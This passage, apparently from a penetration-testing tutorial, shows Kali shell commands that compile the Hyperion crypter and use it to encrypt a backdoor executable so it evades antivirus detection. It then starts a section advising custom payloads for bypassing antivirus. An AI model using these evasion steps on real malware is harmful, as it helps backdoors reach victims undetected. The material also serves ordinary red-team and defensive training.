style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>windows-binaries<span style="color:#ff9d00;font-weight:700">/</span>Hyperion-1.0.zip&nbsp;.<br>root@kali<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">unzip</span>&nbsp;Hyperion-1.0.zip<br>root@kali<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Hyperion-1.0<span style="color:#ff9d00;font-weight:700">/</span><br>root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>Hyperion-1.0#&nbsp;i686-w64-mingw32<span style="color:#ffdd00;font-weight:400">-g</span>++&nbsp;Src<span style="color:#ff9d00;font-weight:700">/</span>Crypter<span style="color:#ff9d00;font-weight:700">/</span>*.cpp&nbsp;-o&nbsp;hyperion.exe<br>root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>Hyperion-1.0#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;-p&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/gcc/</span>i686-w64-mingw32<span style="color:#ff9d00;font-weight:700">/</span>6.1-win32<span style="color:#ff9d00;font-weight:700">/</span>libgcc_s_sjlj-1.dll&nbsp;.<br>root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>Hyperion-1.0#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;-p&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/gcc/</span>i686-w64-mingw32<span style="color:#ff9d00;font-weight:700">/</span>6.1-win32<span style="color:#ff9d00;font-weight:700">/</span>libstdc++-6.dll&nbsp;.<br>root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>Hyperion-1.0#&nbsp;wine&nbsp;hyperion.exe&nbsp;..<span style="color:#ff9d00;font-weight:700">/</span>backdoor.exe&nbsp;..<span style="color:#ff9d00;font-weight:700">/</span>crypted.exe</td></tr></table><br><br><span style="text-decoration:underline;">Using Custom/Uncommon Tools and Payloads</span><br><br>The most foolproof method of bypassing antivirus software protections is to use tools<br>and binaries that are unknown to AV vendors, either by writing your own, or by<br>finding and using unique payloads.<br></span></body></html>